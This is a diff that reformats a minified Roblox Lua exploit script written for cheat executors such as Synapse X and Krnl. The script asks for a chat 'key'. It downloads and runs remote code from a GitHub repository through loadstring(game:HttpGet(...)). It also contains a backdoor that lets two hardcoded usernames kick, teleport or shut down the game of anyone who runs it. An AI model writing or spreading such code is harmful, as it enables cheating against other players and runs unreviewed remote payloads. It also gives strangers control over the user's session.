@@ -1,1 +1,153 @@
-game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Waiting For The Key (??)','All')local a=game.Players.LocalPlayer;local b="NotWhitelisted"print(b)if b=="NotWhitelisted"then print"WaitingForTheKey"a.Chatted:Connect(function(c)if c.message~="?load xyz.lua"then if b=="NotWhitelisted"then print"Not Whitelisted"a:Kick('Wrong key 🤡🤡')end end end)a.Chatted:Connect(function(c)if c:match("?load xyz.lua")then b="Whitelisted"print(b)loadstring(game:HttpGet('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/PrisonLifeCommands',true))()local d=is_sirhurt_closure and"Sirhurt"or pebc_execute and"ProtoSmasher"or syn and"Synapse X"or secure_load and"Sentinel"or KRNL_LOADED and"Krnl"or SONA_LOADED and"Sona"or"Lvl 6 Exploit"game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Commands Loaded (6.8) * Using '..d..' *','All')end end)end;local e=game.Players:GetPlayers()for f=1,#e do e[f].Chatted:connect(function(g,h)if e[f].Name=="MRFRIENDFOVEVER"then local i=string.split(g," ")local a=game.Players.LocalPlayer;if i[1]=="?kick"then print("Kicked "..i[2])if a.Name==i[2]and i[2]~="MRFRIENDFOVEVER"then a:Kick("🤡 Expulsado por un administrador 🤡")end end end end)end;local e=game.Players:GetPlayers()for f=1,#e do e[f].Chatted:connect(function(g,h)if e[f].Name=="MRFRIENDFOVEVER"then local i=string.split(g," ")local a=game.Players.LocalPlayer;if i[1]=="?rjuser"then print("Kicked "..i[2])if a.Name==i[2]and i[2]~="MRFRIENDFOVEVER"then wait(.1)game:GetService("TeleportService"):Teleport(game.PlaceId,game.Players.LocalPlayer)end end end end)end;local e=game.Players:GetPlayers()for f=1,#e do e[f].Chatted:connect(function(g,h)if e[f].Name=="SalmonedaYT"then local i=string.split(g," ")local a=game.Players.LocalPlayer;if i[1]=="?kick"then print("Kicked "..i[2])if a.Name==i[2]and i[2]~="MRFRIENDFOVEVER"then a:Kick("🤡 Expulsado por un administrador 🤡")end end end end)end;local e=game.Players:GetPlayers()for f=1,#e do e[f].Chatted:connect(function(g,h)if e[f].Name=="MRFRIENDFOVEVER"then local i=string.split(g," ")local a=game.Players.LocalPlayer;if i[1]=="?kickrojas"then print("Kicked Rojas")if a.Name=="SalmonedaYT"then a:Kick("🤡 Expulsado por un administrador, Rojitas 😃 🤡")end end end end)end;local e=game.Players:GetPlayers()for f=1,#e do e[f].Chatted:connect(function(g,h)if e[f].Name=="MRFRIENDFOVEVER"then local i=string.split(g," ")local a=game.Players.LocalPlayer;if i[1]=="?rejoinrojas"then print("Kicked Rojas")if a.Name=="SalmonedaYT"then wait(.1)game:GetService("TeleportService"):Teleport(game.PlaceId,game.Players.LocalPlayer)end end end end)end;local e=game.Players:GetPlayers()for f=1,#e do e[f].Chatted:connect(function(g,h)if e[f].Name=="MRFRIENDFOVEVER"then local i=string.split(g," ")local a=game.Players.LocalPlayer;if i[1]=="?disablescript"then print("Kicked All")game:Shutdown()end end end)end;local e=game.Players:GetPlayers()for f=1,#e do e[f].Chatted:connect(function(g,h)if e[f].Name=="MRFRIENDFOVEVER"then local i=string.split(g," ")local a=game.Players.LocalPlayer;if i[1]=="?rejoinusers"then wait(.1)game:GetService("TeleportService"):Teleport(game.PlaceId,game.Players.LocalPlayer)end end end)end;loadstring(game:HttpGet('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/NameTags',true))()wait(1)loadstring(game:HttpGet('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/NameTag2',true))()
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Waiting For The Key (??)', 'All')
+
+local player = game.Players.LocalPlayer
+local yes = "NotWhitelisted"
+
+print(yes)
+
+if yes == "NotWhitelisted" then
+       print"WaitingForTheKey"
+       
+       --Chat Doesnt Match
+       player.Chatted:Connect(function(cht)
+         if cht.message ~= "?load xyz.lua" then
+             if yes == "NotWhitelisted" then
+                 print"Not Whitelisted"
+                 player:Kick('Wrong key 🤡🤡')
+            end
+         end
+    end)
+       
+       --Chat Match
+      player.Chatted:Connect(function(cht)
+         if cht:match("?load xyz.lua") then
+           yes = "Whitelisted"
+          print(yes)
+          loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/PrisonLifeCommands'),true))()
+          local executor =
+                is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+                secure_load and "Sentinel" or
+                KRNL_LOADED and "Krnl" or
+                SONA_LOADED and "Sona" or
+                "Lvl 6 Exploit"
+                
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Commands Loaded (6.8) * Using '.. executor .. ' *', 'All')
+        end
+    end)
+end
+
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "MRFRIENDFOVEVER" then
+        local splitString = string.split(msg, " ")
+        local player = game.Players.LocalPlayer
+        if splitString[1] == "?kick" then
+        print("Kicked ".. splitString[2])
+         if player.Name == splitString[2] and splitString[2] ~= "MRFRIENDFOVEVER" then 
+                player:Kick("🤡 Expulsado por un administrador 🤡")
+            end
+        end
+    end
+  end)
+end
+
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "MRFRIENDFOVEVER" then
+        local splitString = string.split(msg, " ")
+        local player = game.Players.LocalPlayer
+        if splitString[1] == "?rjuser" then
+        print("Kicked ".. splitString[2])
+         if player.Name == splitString[2] and splitString[2] ~= "MRFRIENDFOVEVER" then 
+                wait(.1)
+		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+            end
+        end
+    end
+  end)
+end
+
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "SalmonedaYT" then
+        local splitString = string.split(msg, " ")
+        local player = game.Players.LocalPlayer
+        if splitString[1] == "?kick" then
+        print("Kicked ".. splitString[2])
+         if player.Name == splitString[2] and splitString[2] ~= "MRFRIENDFOVEVER" then 
+                player:Kick("🤡 Expulsado por un administrador 🤡")
+            end
+        end
+    end
+  end)
+end
+
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "MRFRIENDFOVEVER" then
+        local splitString = string.split(msg, " ")
+        local player = game.Players.LocalPlayer
+        if splitString[1] == "?kickrojas" then
+        print("Kicked Rojas")
+         if player.Name == "SalmonedaYT" then 
+                player:Kick("🤡 Expulsado por un administrador, Rojitas 😃 🤡")
+            end
+        end
+    end
+  end)
+end
+
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "MRFRIENDFOVEVER" then
+        local splitString = string.split(msg, " ")
+        local player = game.Players.LocalPlayer
+        if splitString[1] == "?rejoinrojas" then
+        print("Kicked Rojas")
+         if player.Name == "SalmonedaYT" then 
+                wait(.1)
+		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+            end
+        end
+    end
+  end)
+end
+
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "MRFRIENDFOVEVER" then
+        local splitString = string.split(msg, " ")
+        local player = game.Players.LocalPlayer
+        if splitString[1] == "?disablescript" then
+        print("Kicked All")
+                game:Shutdown()
+        end
+    end
+  end)
+end
+
+local Action = game.Players:GetPlayers()
+  for i = 1,#Action do
+Action[i].Chatted:connect(function(msg, recipient)
+    if Action[i].Name == "MRFRIENDFOVEVER" then
+        local splitString = string.split(msg, " ")
+        local player = game.Players.LocalPlayer
+        if splitString[1] == "?rejoinusers" then
+        wait(.1)
+		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
+        end
+    end
+  end)
+end
+
+local function tag1()
+  loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/NameTags'),true))()
+end
+
+tag1()
